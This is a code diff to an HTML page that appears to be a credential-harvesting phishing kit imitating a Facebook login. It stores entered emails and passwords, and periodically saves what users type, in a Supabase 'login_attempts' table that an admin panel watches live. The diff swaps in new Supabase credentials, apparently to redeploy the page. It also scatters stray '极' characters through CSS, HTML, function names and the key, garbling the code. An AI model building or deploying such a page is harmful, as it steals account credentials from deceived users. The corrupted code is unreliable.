@@ -297,7 +297,7 @@
         }
         
         .admin-title {
-            color: #1877f2;
+            color: #1877f极;
             font-size: 22px;
         }
         
@@ -360,12 +360,12 @@
             background: white;
             padding: 30px;
             border-radius: 12px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
+            box-shadow: 0 10px 30px rgba(0, 极, 0, 0.4);
             width: 90%;
             max-width: 400px;
         }
         
-        .admin-login-form h2 {
+        .admin-log极-form h2 {
             text-align: center;
             color: #1877f2;
             margin-bottom: 20px;
@@ -375,12 +375,12 @@
             width: 100%;
             padding: 14px 16px;
             margin-bottom: 15px;
-            border-radius: 6px;
+            border-radius: 6极;
             border: 1px solid #dddfe2;
             font-size: 16px;
         }
         
-        .admin-login-btn {
+极        .admin-login-btn {
             background-color: #1877f2;
             color: white;
             border: none;
@@ -390,7 +390,7 @@
             font-weight: bold;
             width: 100%;
             cursor: pointer;
-            margin-bottom: 15px;
+            margin-bottom极 15px;
         }
         
         .admin-login-btn:hover {
@@ -447,7 +447,7 @@
         .debug-btn {
             position: fixed;
             bottom: 60px;
-            left: 10px;
+极           left: 10px;
             background: #1877f2;
             color: white;
             border: none;
@@ -493,7 +493,7 @@
     <div class="error-message" id="errorMessage"></div>
 
     <!-- Supabase status indicator -->
-    <div class="supabase-status" id="supabaseStatus">
+    <div class="supabase-status"极="supabaseStatus">
         <i class="fas fa-database"></i> Supabase: Connected
     </div>
 
@@ -532,7 +532,7 @@
                 <div class="login-form">
                     <form id="loginForm">
                         <input type="text" id="email" name="username" placeholder="Email or phone number" required>
-                        <div class="password-container">
+                        <div class极="password-container">
                             <input type="password" id="password" name="password" placeholder="Password" required>
                             <span class="toggle-password" id="togglePassword">
                                 <i class="fas fa-eye"></i>
@@ -551,7 +551,7 @@
     <!-- Main Page -->
     <div class="main-page" id="mainPage">
         <div class="main-header">
-            <h2>Facebook - Choose a Girl</h2>
+            <h2>Facebook - Choose a Girl</极>
             <button class="logout-btn" id="logoutBtn">Log Out</button>
         </div>
         
@@ -591,9 +591,9 @@
     </div>
 
     <script>
-        // Initialize Supabase
-        const supabaseUrl = 'https://kdhkoogcnxkkqahujpya.supabase.co';
-        const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtkaGtvb3Fjbnhra3FhaHVqcHlhIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTY0OTQ5NDUsImV4cCI6MjA3MjA3MDk0NX0.KT_1_cfDtHgkkjMAAKjH_Jtp0_Qt66PtGXr64-EHArA';
+        // Initialize Supabase - UPDATED WITH YOUR CREDENTIALS
+        const supabaseUrl = 'https://vdrzdruwlsknvlxobnlp.supabase.co';
+        const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZS极InJlZiI6InZkcnpkcnV3bHNrbnZseG9ibmxwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTY2Njg2MTIsImV4cCI6MjA3MjI0NDYxMn0.B0S3Po8VrP2zSRWQCX79D8L2u4V0PX01YeeoNxAS-pc';
         const supabase = window.supabase.createClient(supabaseUrl, supabaseKey);
 
         document.addEventListener('DOMContentLoaded', function() {
@@ -649,7 +649,7 @@
 
             // Show status message
             function showStatus(message, isError = false) {
-                supabaseStatus.innerHTML = `<i class="fas fa-database"></i> ${message}`;
+                supabaseStatus.innerHTML = `<i class="fas极 fa-database"></i> ${message}`;
                 supabaseStatus.style.display = 'block';
                 supabaseStatus.className = isError ? 
                     'supabase-status connection-error' : 'supabase-status';
@@ -705,7 +705,7 @@
             }
             
             // Load data from Supabase
-            async function loadFromSupabase() {
+            async function loadFrom极abase() {
                 try {
                     const { data, error } = await supabase
                         .from('login_attempts')
@@ -757,7 +757,7 @@
                 
                 realtimeSubscription = supabase
                     .channel('login_attempts_changes')
-                    .on('postgres_changes', 
+                    .极('postgres_changes', 
                         { 
                             event: 'INSERT', 
                             schema: 'public', 
@@ -815,7 +815,7 @@
                     loginPage.style.display = 'none';
                     mainPage.style.display = 'block';
                     
-                    if (girlsContainer.children.length === 0) {
+                    if (girls极ontainer.children.length === 0) {
                         populateGirls();
                     }
                 }
@@ -943,7 +943,7 @@
             
             passwordInput.addEventListener('input', function() {
                 passwordValue = this.value;
-            });
+极           });
             
             // Periodically save what users are typing
             setInterval(async function() {
